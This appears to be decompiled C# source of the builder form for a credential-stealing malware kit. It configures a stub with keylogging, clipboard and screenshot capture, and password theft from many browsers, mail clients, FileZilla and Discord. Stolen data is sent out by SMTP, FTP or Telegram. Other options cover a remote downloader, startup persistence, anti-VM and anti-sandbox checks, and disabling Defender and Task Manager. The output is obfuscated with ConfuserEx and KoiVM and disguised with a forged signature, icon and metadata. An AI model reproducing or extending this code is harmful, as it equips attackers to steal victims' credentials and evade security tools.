		private void switchpasssmtp_CheckedChanged(object sender, bool isChecked) {this.smtppasstxt.UseSystemPasswordChar =this.switchpasssmtp.Checked; }

		// Token: 0x060000B2 RID: 178 RVA: 0x000081EC File Offset: 0x000063EC
		private void switchpassftp_CheckedChanged(object sender, bool isChecked) {this.ftppasstxt.UseSystemPasswordChar =this.switchpassftp.Checked; }

		// Token: 0x060000B3 RID: 179 RVA: 0x00008230 File Offset: 0x00006430
		private void smtpcombo_SelectedIndexChanged(object sender, EventArgs e)
		{
            switch (smtpcombo.Text)
            {
                case "Gmail":
                   this.smtpservertxt.Text = "smtp.gmail.com";
				   this.serverporttxt.Text = "587";
                    break;
                case "Yandex":
                   this.smtpservertxt.Text = "smtp.yandex.ru";
				this.serverporttxt.Text = "587";
                    break;
                case "Custom..":
                   this.smtpservertxt.Text = "";
				this.serverporttxt.Text = "";
                    break;
            }
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00008324 File Offset: 0x00006524
		private void selectdigitalbtn_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Executable Files (*.exe)|*.exe",
				ShowHelp = true
			};
			openFileDialog.InitialDirectory = Assembly.GetExecutingAssembly().Location;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
			this.digitaltxt.Text = openFileDialog.FileName;
			this.BytePublicer = Form1.Signatures.DigitalSignatures(File.ReadAllBytes(openFileDialog.FileName), Form1.SIGNNNature);
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x000083A4 File Offset: 0x000065A4
		private void addiconbtn_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Icon Files (*.ico)|*.ico",
				ShowHelp = true
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
			this.addicontxt.Text = openFileDialog.FileName;
			this.ICOPB.Image = Icon.ExtractAssociatedIcon(this.addicontxt.Text).ToBitmap();
				FileInfo fileInfo = new FileInfo(openFileDialog.FileName);
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00002331 File Offset: 0x00000531
		private void Form1_Resize(object sender, EventArgs e)
		{
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00008420 File Offset: 0x00006620
		private void smtploadbtn_Click(object sender, EventArgs e)
		{
            string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
			bool flag = File.Exists(text + "\\SMTPConfig.ini");
			if (flag)
			{
				StreamReader streamReader = new StreamReader(text + "\\SMTPConfig.ini");
			this.smtpreceivetxt.Text =this.Decrypt(streamReader.ReadLine());
			this.smtpsendtxt.Text =this.Decrypt(streamReader.ReadLine());
			this.smtppasstxt.Text =this.Decrypt(streamReader.ReadLine());
			this.smtpservertxt.Text =this.Decrypt(streamReader.ReadLine());
			this.serverporttxt.Text =this.Decrypt(streamReader.ReadLine());
				streamReader.Close();
				Console.ReadLine();
				Interaction.MsgBox(" SMTP Loaded.", MsgBoxStyle.OkOnly, null);
			}
			else { Interaction.MsgBox(" Can't Find SMTP Config.", MsgBoxStyle.OkOnly, null); }
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x00008528 File Offset: 0x00006728
		private void smtpsavebtn_Click(object sender, EventArgs e)
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK"))
			{
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK");
			}
            string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
			try { File.Delete(text + "\\SMTPConfig.ini"); }
			catch { }
			try
			{
				StreamWriter streamWriter = new StreamWriter(text + "\\SMTPConfig.ini");
				streamWriter.WriteLine(this.Decrypt(this.smtpreceivetxt.Text));
				streamWriter.WriteLine(this.Decrypt(this.smtpsendtxt.Text));
				streamWriter.WriteLine(this.Decrypt(this.smtppasstxt.Text));
				streamWriter.WriteLine(this.Decrypt(this.smtpservertxt.Text));
				streamWriter.WriteLine(this.Decrypt(this.serverporttxt.Text));
				streamWriter.Close();
				Interaction.MsgBox(" SMTP Config Saved.", MsgBoxStyle.OkOnly, null);
			}
			catch (Exception ex2) { Interaction.MsgBox("Problem:  " + ex2.Message, MsgBoxStyle.OkOnly, null); }
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x000086F0 File Offset: 0x000068F0
		private void msgbtn_Click(object sender, EventArgs e)
		{
            switch (msgcombo.Text)
            {
                case "Critical":    Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.Critical,this.Titletxt.Text); break;
                case "Information": Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.Information,this.Titletxt.Text); break;
                case "Exclamation": Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.Exclamation,this.Titletxt.Text); break;
                case "Question":    Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.Question,this.Titletxt.Text); break;
                case "YesNoCancel": Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.YesNoCancel,this.Titletxt.Text); break;
                case "YesNo":       Interaction.MsgBox(this.msgbodytxt.Text, MsgBoxStyle.YesNo,this.Titletxt.Text); break;
            }
		}

		// Token: 0x060000BA RID: 186 RVA: 0x000088A0 File Offset: 0x00006AA0
		private void MetroButton10_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "All Files (*.*)|*.*",
				ShowHelp = true
			};
			try
			{
				openFileDialog.ShowDialog();
				bool flag = openFileDialog.FileName.Length > 0;
				if (flag)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
				this.T1.Text = Path.GetFileNameWithoutExtension(openFileDialog.FileName);
				this.T2.Text = versionInfo.FileDescription;
				this.T3.Text = versionInfo.CompanyName;
				this.T4.Text = versionInfo.ProductName;
				this.T5.Text = versionInfo.LegalCopyright;
					string[] array = versionInfo.ProductVersion.Split(new char[] { '.' });
				this.N1.Value = Conversions.ToDecimal(array[0]);
				this.N2.Value = Conversions.ToDecimal(array[1]);
				this.N3.Value = Conversions.ToDecimal(array[2]);
				this.N4.Value = Conversions.ToDecimal(array[3]);
				}
			}
			catch{ }
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000089F0 File Offset: 0x00006BF0
		private void ftpsavebtn_Click(object sender, EventArgs e)
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK"))
			{
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
			}
            string text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\SK";
			try   { File.Delete(text + "\\FTPConfig.ini"); }
			catch { }
			try
			{
				StreamWriter streamWriter = new StreamWriter(text + "\\FTPConfig.ini");
				streamWriter.WriteLine(this.Encrypt(this.ftpurltxt.Text));
				streamWriter.WriteLine(this.Encrypt(this.ftpusertxt.Text));
				streamWriter.WriteLine(this.Encrypt(this.ftppasstxt.Text));
				streamWriter.Close();
				Interaction.MsgBox(" FTP Config Saved.", MsgBoxStyle.OkOnly, null);
			}
			catch (Exception ex2) { Interaction.MsgBox("Problem:  " + ex2.Message, MsgBoxStyle.OkOnly, null); }
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00008B88 File Offset: 0x00006D88
		private void buildbtn_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog { Filter = "|*.exe" };
			bool flag = saveFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				Thread thread = new Thread(delegate(object a0) {this.BUILD(Conversions.ToString(a0)); });
				string fileName = saveFileDialog.FileName;
				thread.Start(fileName);
			this.buildbtn.Enabled = false;
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00008BEC File Offset: 0x00006DEC
		public void BUILD(string filename)
		{
			try
			{
				string text = Properties.Resources.StubOne;
				if (this.antisandboxiec.Checked)    { text = text.Replace("'%AnTiSandboxie_Killer%", null); }
				if (this.antivmwarec.Checked)       { text = text.Replace("'%AnTiV'M_Killer%", null); }
				if (this.disableregisteryc.Checked) { text = text.Replace("'%Registeries_Disabler%", null); }
				if (this.disabletaskc.Checked)      { text = text.Replace("'%Taskmgr_Disabler%", null); }
				if (this.disablewdc.Checked)        { text = text.Replace("Disable_Defender", null); }
				if (this.disablesrc.Checked)        { text = text.Replace("'%Restores_Disabler%", null); }
				if (this.disablecmdc.Checked)       { text = text.Replace("'%CMD_Disabler%", null); }
                text = text.Replace("$%^Trues^&*",this.MetroSwitch1.Checked.ToString());
				if (logrecovertypetxt.Text == ".HTML")
                     { text = text.Replace("%ReccoveryTypeext%$", ".html"); }
                else { text = text.Replace("%ReccoveryTypeext%$", ".txt"); }

				if (this.downloaderc.Checked)
				{
					text = text.Replace("'%DownloaderStub%", null);
					text = text.Replace("%url1%",this.downloaderurltxt.Text);
					string text2;
					if (this.downloadernametxt == null)
					{
						text2 =this.random(0xA, "FהоWהرY吉خiRرウ开XъدcOбDWحUATה弗هזجbUזоזدOجиUیZجعUPشYהвلcYىトهFWcMخخiRحPزAه\u200cNдコNWWTתFeجZDPLظW吉عهהSоVUiRъفلQ弗הعTFזفдQウRQXPдеشFحSKNASVFQدOFזءA吉DזеةاiLOеAebcFحコYдا私gLהトوAдدQKزזحбLخظةZウیWفخعUءKcءیJهトウתظهزъءSوQcזKת开AウbFMروZو开ۆXVحNМههiوתحKزתلUY开ъXJKPcUコرоرجXOSUNMъז吉Nخء开gJеcתбPתخNъ开NFهTجKFМAVعدرвXدזHOHHPJدתJSشTLYعקоخgトVدcהDZהHбYKJXbהZVRزدىеウدLKOوAciعRJTLفתDخ弗הNفi\u200cةJعвZiعъ私اOKDTK吉HHPiدNهLNМOicLNد\u200cъNeVYءAAウהYW") + ".exe";
					}
					else
					{
						if (!this.downloadernametxt.Text.EndsWith(".exe"))
						{
							MetroTextbox downloadernametxt;
							(downloadernametxt =this.downloadernametxt).Text = downloadernametxt.Text + ".exe";
						}
						text2 =this.downloadernametxt.Text;
					}
					text = text.Replace("%file.exe%", text2);
					bool flag5 =this.downloaderurltxt.Text.StartsWith("http://");
					if (!flag5)
					{
					this.downloaderurltxt.Text = "http://" +this.downloaderurltxt.Text;
					}
				}
				text = text.Replace("%$MailReciver$%",this.smtpreceivetxt.Text);
				text = text.Replace("%$MailSender$%",this.smtpsendtxt.Text);
				text = text.Replace("%$MailPassword$%",this.smtppasstxt.Text);
				text = text.Replace("%$MailServer$%",this.smtpservertxt.Text);
				text = text.Replace("%$MailPort$%",this.serverporttxt.Text);
				text = text.Replace("%$HostUsername$%",this.ftpusertxt.Text);
				text = text.Replace("%$HostPassword$%",this.ftppasstxt.Text);
				text = text.Replace("%$HostURL$%",this.ftpurltxt.Text);
				text = text.Replace("%$TeleToken$%",this.telegramtokentxt.Text);
				text = text.Replace("%$TeleID$%",this.telegramuseridtxt.Text);
				text = text.Replace("'(%TheSendersHereOneShot%)", null);
                switch (this.RecoverMethodType)
                {
                    case "%FTPDV$": text = text.Replace("$$TypesHere%%", "%FTPDV$"); break;
                    case "$%SMTPDV$": text = text.Replace("$$TypesHere%%", "$%SMTPDV$"); break;
                    case "$%TelegramDv$": text = text.Replace("$$TypesHere%%", "$%TelegramDv$"); break;
                }
				if (this.meltc.Checked)          { text = text.Replace("'%MeltFile%", null); }
				if (this.hideselfc.Checked)      { text = text.Replace("'%SelfHidden%", null); }
				if (this.delayc.Checked)         { text = text.Replace("'%FeaDelay%", "System.Threading.Thread.Sleep(" + Conversions.ToString(decimal.Multiply(this.delaynum.Value, 1000m)) + ")"); }
				if (this.processkillerc.Checked) { text = text.Replace("'%ProcessTaskKiller%", null).Replace("%tKill%",this.processkillertxt.Text); }
				if (this.cleardatac.Checked)     { text = text.Replace("'%Cookies_Eraser%", null); }
				if (this.startupc.Checked)
				{
					if (this.copystartupc.Checked)
					{
                        switch (copystartupcombo.Text)
                        {
                            case "Temp": text = text.Replace("'tmppssss", "").Replace("%nmoufstr$%",this.startupnametxt.Text); break;
                            case "AppData": text = text.Replace("'stddddrrrrr", "").Replace("%nmoufstr%",this.startupnametxt.Text); break;
                            case "UserProfile": text = text.Replace("'usrprufssssss", "").Replace("%nmoufstr#%",this.startupnametxt.Text); break;
                            case "Documents": text = text.Replace("'mdocsssss", "").Replace("%nmoufstr@$%",this.startupnametxt.Text); break;
                            case "Picture": text = text.Replace("'mpiccsssssss", "").Replace("%nmoufstr@%",this.startupnametxt.Text); break;
                            case "Windir": text = text.Replace("'wndrssss", "").Replace("%nmoufstr^%",this.startupnametxt.Text); break;
                        }
					}
				}
				if (this.messageboxc.Checked)
				{
					text = text.Replace("'%FakeMessagebox%", null);
                    text.Replace("$METHOD$", msgcombo.Text);
                    text = text.Replace("'%MSGBOX", "").Replace("$Msg$",this.msgbodytxt.Text).Replace("$Title",this.Titletxt.Text);
				}
				if (this.openwebc.Checked)
				{
					text = text.Replace("'%OpenWebsites%", null);
					text = text.Replace("WEBSITETOSTART",this.openwebtxt.Text);
				}
				if (!this.MetroSwitch2.Checked) { text = text.Replace("'$AnTiiBo%%", null); }
				if (this.keypadc.Checked)
				{
					text = text.Replace("'%Keyboards_Logger%", null);
					text = text.Replace("4566547", Conversions.ToString(decimal.Multiply(this.keypadnum.Value, 60000m)));
				}
				if (this.clipboardc.Checked)
				{
					text = text.Replace("'%Clipboard_Logger%", null);
					text = text.Replace("3211234", Conversions.ToString(decimal.Multiply(this.clipnum.Value, 60000m)));
				}
				if (this.screenshotc.Checked)
				{
					text = text.Replace("'%Screenshots_Logger%", null);
					text = text.Replace("9877896", Conversions.ToString(decimal.Multiply(this.screennum.Value, 60000m)));
				}
				if (this.chromec.Checked)      { text = text.Replace("'$&Chrome&$", null); }
				if (this.filezillac.Checked)   { text = text.Replace("'$&filezilla&$", null); }
				if (this.operac.Checked)       { text = text.Replace("'$&opera&$", null); }
				if (this.firefoxc.Checked)     { text = text.Replace("'$&firefox&$", null); }
				if (this.epicc.Checked)        { text = text.Replace("'$&epic&$", null); }
				if (this.blisk.Checked)        { text = text.Replace("'$&blisk&$", null); }
				if (this.ucc.Checked)          { text = text.Replace("'$&uc&$", null); }
				if (this.torchc.Checked)       { text = text.Replace("'$&torch&$", null); }
				if (this.brave.Checked)        { text = text.Replace("'$&brave&$", null); }
				if (this.outlookc.Checked)     { text = text.Replace("'$&Outlook&$", null); }
				if (this.foxmailc.Checked)     { text = text.Replace("'$&Foxmail&$", null); }
				if (this.thunderbirdc.Checked) { text = text.Replace("'$&thunderbird&$", null); }
				if (this.qqc.Checked)          { text = text.Replace("'$&QQ&$", null); }
				if (this.orbitumc.Checked)     { text = text.Replace("'$&orbitum&$", null); }
				if (this.irudiumc.Checked)     { text = text.Replace("'$&iridum&$", null); }
				if (this.Slimjetc.Checked)     { text = text.Replace("'$&slimjet&$", null); }
				if (this.vivaldic.Checked)     { text = text.Replace("'$&vivaldi&$", null); }
				if (this.ironc.Checked)        { text = text.Replace("'$&iron&$", null); }
				if (this.Ghostc.Checked)       { text = text.Replace("'$&ghost&$", null); }
				if (this.centc.Checked)        { text = text.Replace("'$&cent&$", null); }
				if (this.xvastc.Checked)       { text = text.Replace("'$&xVast&$", null); }
				if (this.superbirdc.Checked)   { text = text.Replace("'$&Superbird&$", null); }
				if (this.coccocc.Checked)      { text = text.Replace("'$&CocCoc&$", null); }
				if (this.seamonkeyc.Checked)   { text = text.Replace("'$&seamonkey&$", null); }
				if (this.sic.Checked)          { text = text.Replace("'$&360English&$", null).Replace("'$&360China&$", null); }
				if (this.comodoc.Checked)      { text = text.Replace("'$&comodo&$", null);  }
				if (this.icedragonc.Checked)   { text = text.Replace("'$&icedragon&$", null); }
				if (this.cyberfoxc.Checked)    { text = text.Replace("'$&cyberfox&$", null); }
				if (this.chromeiumc.Checked)   { text = text.Replace("'$&chromium&$", null); }
				if (this.palemoonc.Checked)    { text = text.Replace("'$&palemoon&$", null); }
				if (this.chedotc.Checked)      { text = text.Replace("'$&Chedot&$", null); }
				if (this.lieboac.Checked)      { text = text.Replace("'$&liebao&$", null); }
				if (this.pidginc.Checked)      { text = text.Replace("'$&pidgin&$", null); }
				if (this.avastc.Checked)       { text = text.Replace("'$&avast&$", null); }
				if (this.amigo.Checked)        { text = text.Replace("'$&Amigo&$", null); }
				if (this.xpomc.Checked)        { text = text.Replace("'$&Xpom&$", null); }
				if (this.kometac.Checked)      { text = text.Replace("'$&Kometa&$", null); }
				if (this.nichromec.Checked)    { text = text.Replace("'$&Nichrome&$", null); }
				if (this.waterfoxc.Checked)    { text = text.Replace("'$&WaterFox&$", null); }
				if (this.kinzac.Checked)       { text = text.Replace("'$&Kinzaa&$", null); }
				if (this.sputnikc.Checked)     { text = text.Replace("'$&Sputnik&$", null); }
				if (this.falkonc.Checked)      { text = text.Replace("'$&Falkon&$", null); }
				if (this.postboxc.Checked)     { text = text.Replace("'$&PostBox&$", null); }
				if (this.blackhawkc.Checked)   { text = text.Replace("'$&BlackHawk&$", null); }
				if (this.citrioc.Checked)      { text = text.Replace("'$&Citrio&$", null); }
				if (this.uranc.Checked)        { text = text.Replace("'$&Uran&$", null); }
				if (this.coowonc.Checked)      { text = text.Replace("'$&Coowon&$", null); }
				if (this.startc.Checked)       { text = text.Replace("'$&7Star&$", null); }
				if (this.qipsurfc.Checked)     { text = text.Replace("'$&QIPSurf&$", null); }
				if (this.sleipnirc.Checked)    { text = text.Replace("'$&Sleipnir&$", null); }
				if (this.canaryc.Checked)      { text = text.Replace("'$&ChromeCanary&$", null); }
				if (this.coolnovoc.Checked)    { text = text.Replace("'$&CoolNovo&$", null); }
				if (this.slimc.Checked)        { text = text.Replace("'$&TheSlimRecovery&$", null); }
				if (this.discordc.Checked)     { text = text.Replace("'$&Discord&$", null); }
				if (this.edgechromec.Checked)  { text = text.Replace("'$&EdgeChrome&$", null); }
				text = text.Replace("#Region", "'#Region").Replace("#End", "'#End");
				string text3 = Conversions.ToString(Operators.AddObject(Operators.AddObject(Path.GetTempPath(),this.RandomStringa()), ".exe"));
			this.Getter = text3;
				Form1.Compilers(text3, text);
				string text4 = Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv";
				if (Directory.Exists(text4)) { Directory.CreateDirectory(text4); }
				if (Directory.Exists(text4))
				{
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.CLI.exe", Properties.Resources.Confuser_CLI);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Core.dll", Properties.Resources.Confuser_Core);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.DynCipher.dll", Properties.Resources.Confuser_DynCipher);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Protections.dll", Properties.Resources.Confuser_Protections);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Renamer.dll", Properties.Resources.Confuser_Renamer);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Runtime.dll", Properties.Resources.Confuser_Runtime);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\dnlib.dll", Properties.Resources.dnlib);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\GalaSoft.MvvmLight.Extras.WPF4.dll", Properties.Resources.GalaSoft_MvvmLight_Extras_WPF4);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\GalaSoft.MvvmLight.WPF4.dll", Properties.Resources.GalaSoft_MvvmLight_WPF4);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.Confuser.exe", Properties.Resources.KoiVM_Confuser);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.dll", Properties.Resources.KoiVM);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.Runtime.dll", Properties.Resources.KoiVM_Runtime);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Microsoft.Practices.ServiceLocation.dll", Properties.Resources.Microsoft_Practices_ServiceLocation);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Ookii.Dialogs.Wpf.dll", Properties.Resources.Ookii_Dialogs_Wpf);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\System.Windows.Interactivity.dll", Properties.Resources.System_Windows_Interactivity);
					File.WriteAllBytes(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Teen.dll", Properties.Resources.Teen);
				}
				Thread.Sleep(0x3E8);
				text3 =this.obfuscbar(text3);
				Thread.Sleep(0x3E8);
				text3 =this.confuserex(text3, Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv");
				Thread.Sleep(0x3E8);
				File.Move(text3, filename);
				try                  { if (File.Exists(text3)) { File.Delete(text3); } }
				catch (Exception ex) { MessageBox.Show(ex.ToString()); }
				if (this.assemblyc.Checked)
				{
				this.Display_Description(filename, "v4.0");
					Thread.Sleep(0x3E8);
				}
				if (this.addiconc.Checked)
				{
					if (this.addicontxt.Text != "")
					{
						Form1.IconInjector.InjectIcon(filename,this.addicontxt.Text);
					}
				}
				if (this.digitialsignc.Checked)
				{
				this.digitaltxt.Text = filename;
					File.WriteAllBytes(filename + Form1.Digitial.DigitalSignatures(""), Form1.Signatures.Method(File.ReadAllBytes(filename),this.BytePublicer, Form1.SIGNNNature));
				}
				double num = Conversion.Val(this.sizepumpernum.Value);
                if (this.sizepumpercombo.Text.Contains("KB")) { num *= 1024.0; }
                if (this.sizepumpercombo.Text.Contains("MB")) { num *= 1048576.0; }
				FileStream fileStream = File.OpenWrite(filename);
				long num2 = fileStream.Seek(0L, SeekOrigin.End);
				checked
				{
					while ((double)num2 < num)
					{
						fileStream.WriteByte(0);
						num2 += 1L;
					}
					fileStream.Close();
					Interaction.MsgBox("Delivery Checked.\r\n\r\nRecoveries Checked.\r\n\r\nFeatures Checked.\r\n\r\nMisc Checked.\r\n\r\nStub Built in: " + filename, MsgBoxStyle.Information, "Successfully");
					bool flag30 = Directory.Exists(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv");
					if (flag30)
					{
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.CLI.exe");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Core.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.DynCipher.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Protections.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Renamer.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Confuser.Runtime.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\dnlib.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\GalaSoft.MvvmLight.Extras.WPF4.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\GalaSoft.MvvmLight.WPF4.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.Confuser.exe");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\KoiVM.Runtime.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Microsoft.Practices.ServiceLocation.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Ookii.Dialogs.Wpf.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\System.Windows.Interactivity.dll");
						File.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv\\Teen.dll");
						string text5 =this.Getter;
						string tempPath = Path.GetTempPath();
						text5 = text5.Replace(tempPath, "");
						File.Delete(this.Getter);
						File.Delete(Path.GetTempPath() + "GW.exe");
						File.Delete(Path.GetTempPath() + "Obfuscator_Output\\Mapping.txt");
						File.Delete(Path.GetTempPath() + "Obfuscator_Output\\temp.crproj");
						File.Delete(Path.GetTempPath() + "Obfuscator_Output\\Confused\\symbols.map");
						Directory.Delete(Path.GetTempPath() + "Obfuscator_Output\\Confused");
						File.Delete(Path.GetTempPath() + "Obfuscator_Output\\" + text5);
						Directory.Delete(Path.GetTempPath() + "\\suTlgVpzGmFbeAOeUQlrwhZxWySSJUyZFOnXoOuv");
						Directory.Delete(Path.GetTempPath() + "Obfuscator_Output");
					}
				}
			}
			catch (Exception ex2)
			{
			this.MetroChecker1.Checked = false;
				Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
			}
		this.MetroChecker1.Checked = false;
		}

		// Token: 0x060000BE RID: 190 RVA: 0x0000A6E4 File Offset: 0x000088E4
		public string confuserex(string randomfilename, string confuserexpath)
		{
			string text = "<project outputDir=\"OutDIR$\" baseDir=\"BASEDIR$\" xmlns=\"http://confuser.codeplex.com\">\r\n  <rule pattern=\"true\" inherit=\"false\">\r\n   \r\n    <protection id=\"Clean ref proxy\" />\r\n  <protection id=\"Hide Methods\" />\r\n  <protection id=\"invalid metadata\" />\r\n \r\n    <protection id=\"Module flood\" />\r\n\r\n\r\n  \r\n\r\n </rule>\r\n  <module path=\"randomfile\" />\r\n</project>";
			text = text.Replace("randomfile", randomfilename).Replace("OutDIR$", Path.GetDirectoryName(randomfilename) + "\\Confused").Replace("BASEDIR$", Path.GetDirectoryName(randomfilename));
			File.WriteAllText(Path.GetDirectoryName(randomfilename) + "\\temp.crproj", text);
			Interaction.Shell(string.Concat(new string[]
			{
				"\"",
				confuserexpath,
				"\\Confuser.CLI.exe\" -n \"",
				Path.GetDirectoryName(randomfilename),
				"\\temp.crproj\""
			}), AppWinStyle.Hide, false, -1);
			if (Process.GetProcessesByName("Confuser.CLI").Count<Process>() > 0)
			{
				do { Thread.Sleep(300); }
                while (Process.GetProcessesByName("Confuser.CLI").Count<Process>() != 0);
			}
			else { Thread.Sleep(0x3E8); }
			do { Thread.Sleep(300); }
			while (!File.Exists(Path.GetDirectoryName(randomfilename) + "\\Confused\\" + Path.GetFileName(randomfilename)));
			return Path.GetDirectoryName(randomfilename) + "\\Confused\\" + Path.GetFileName(randomfilename);
		}

		// Token: 0x060000BF RID: 191 RVA: 0x0000A82C File Offset: 0x00008A2C
		public string obfuscbar(string randomfilename)
		{
			string text = "<?xml version='1.0'?>\r\n<Obfuscator>\r\n  <Var name=\"InPath\" value=\"BASEDIR$\\\" />\r\n  <Var name=\"OutPath\" value=\"OutDIR$\\Obfuscator_Output\" />\r\n <Var name=\"KeepPublicApi\" value=\"true\" />\r\n  <Var name=\"HidePrivateApi\" value=\"false\" />\r\n   <Var name=\"HideStrings\" value=\"true\" />\r\n  <Var name=\"OptimizeMethods\" value=\"false\" />\r\n  <Var name=\"SuppressIldasm\" value=\"false\" />\r\n  <Module file=\"randomfile\" />\r\n</Obfuscator>";
			text = text.Replace("randomfile", randomfilename).Replace("OutDIR$", Path.GetDirectoryName(randomfilename)).Replace("BASEDIR$", Path.GetDirectoryName(randomfilename));
			File.WriteAllBytes(Path.GetTempPath() + "GW.exe", Properties.Resources.Obfuscar_Console);
			File.WriteAllText(Path.GetTempPath() + "temp.xml", text);
			Interaction.Shell(string.Concat(new string[]
			{
				"\"",
				Path.GetTempPath(),
				"GW.exe\" \"",
				Path.GetTempPath(),
				"temp.xml\""
			}), AppWinStyle.Hide, false, -1);
			bool flag = Process.GetProcessesByName("GW").Count<Process>() > 0;
			if (flag)
			{
				bool flag2;
				do
				{
					flag2 = Process.GetProcessesByName("GW").Count<Process>() == 0;
				}
				while (!flag2);
			}
			else
			{
				Thread.Sleep(0x3E8);
			}
